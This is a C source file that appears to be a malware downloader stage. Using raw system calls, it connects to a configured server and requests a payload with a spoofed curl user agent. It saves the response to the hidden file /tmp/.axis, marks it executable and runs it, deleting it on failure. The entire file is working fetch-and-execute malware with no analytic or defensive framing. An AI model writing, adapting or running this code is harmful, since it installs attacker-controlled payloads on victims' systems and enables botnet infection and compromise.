#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#include "dlr.h"

#ifndef __NR_socket
#define __NR_socket 41
#endif
#ifndef __NR_connect
#define __NR_connect 42
#endif
#ifndef __NR_read
#define __NR_read 0
#endif
#ifndef __NR_write
#define __NR_write 1
#endif
#ifndef __NR_open
#define __NR_open 2
#endif
#ifndef __NR_close
#define __NR_close 3
#endif
#ifndef __NR_exit
#define __NR_exit 60
#endif
#ifndef __NR_fork
#define __NR_fork 57
#endif
#ifndef __NR_execve
#define __NR_execve 59
#endif
#ifndef __NR_chmod
#define __NR_chmod 90
#endif
#ifndef __NR_unlink
#define __NR_unlink 87
#endif

static int xsocket(int domain, int type, int protocol) {
    return syscall(__NR_socket, domain, type, protocol);
}

static int xconnect(int fd, const struct sockaddr *addr, socklen_t addrlen) {
    return syscall(__NR_connect, fd, addr, addrlen);
}

static ssize_t xread(int fd, void *buf, size_t count) {
    return syscall(__NR_read, fd, buf, count);
}

static ssize_t xwrite(int fd, const void *buf, size_t count) {
    return syscall(__NR_write, fd, buf, count);
}

static int xopen(const char *pathname, int flags, mode_t mode) {
    return syscall(__NR_open, pathname, flags, mode);
}

static int xclose(int fd) {
    return syscall(__NR_close, fd);
}

static int xchmod(const char *path, mode_t mode) {
    return syscall(__NR_chmod, path, mode);
}

static int xunlink(const char *path) {
    return syscall(__NR_unlink, path);
}

static int xexecve(const char *filename, char *const argv[], char *const envp[]) {
    return syscall(__NR_execve, filename, argv, envp);
}

static void xexit(int status) {
    syscall(__NR_exit, status);
}

static void die(const char *msg) {
    /* Write error message to stderr */
    int len = 0;
    while (msg[len]) len++;
    xwrite(2, msg, len);
    xexit(1);
}

int main(void) {
    int fd, out_fd;
    struct sockaddr_in addr;
    char buf[4096];
    const char *output_path = "/tmp/.axis";
    char *argv[] = {(char *)output_path, NULL};
    char *envp[] = {NULL};
    ssize_t n;

    /* Create output file */
    out_fd = xopen(output_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out_fd < 0) die("Failed to open output file\n");

    /* Create socket */
    fd = xsocket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) die("Failed to create socket\n");

    /* Connect to HTTP server */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    addr.sin_addr.s_addr = inet_addr(HTTP_SERVER);

    if (xconnect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        die("Failed to connect\n");
    }

    /* Send HTTP GET request */
    char request[512];
    int req_len = snprintf(request, sizeof(request),
        "GET %s HTTP/1.0\r\n"
        "Host: %s\r\n"
        "User-Agent: curl/7.68.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n",
        DLR_PATH, HTTP_SERVER);

    if (xwrite(fd, request, req_len) < 0) {
        die("Failed to send request\n");
    }

    /* Read response, skip HTTP headers */
    int headers_done = 0;
    int total = 0;

    while ((n = xread(fd, buf, sizeof(buf))) > 0) {
        if (!headers_done) {
            /* Find end of headers (double CRLF) */
            char *p = buf;
            for (int i = 0; i < n - 3; i++) {
                if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
                    p = buf + i + 4;
                    int body_len = n - (i + 4);
                    if (body_len > 0) {
                        xwrite(out_fd, p, body_len);
                        total += body_len;
                    }
                    headers_done = 1;
                    break;
                }
            }
            if (!headers_done) continue;
        } else {
            xwrite(out_fd, buf, n);
            total += n;
        }
    }

    xclose(fd);
    xclose(out_fd);

    if (total == 0) {
        xunlink(output_path);
        die("Downloaded empty file\n");
    }

    /* Make executable */
    xchmod(output_path, 0755);

    /* Execute */
    xexecve(output_path, argv, envp);

    /* If execve fails, clean up and exit */
    xunlink(output_path);
    xexit(1);

    return 0;
}
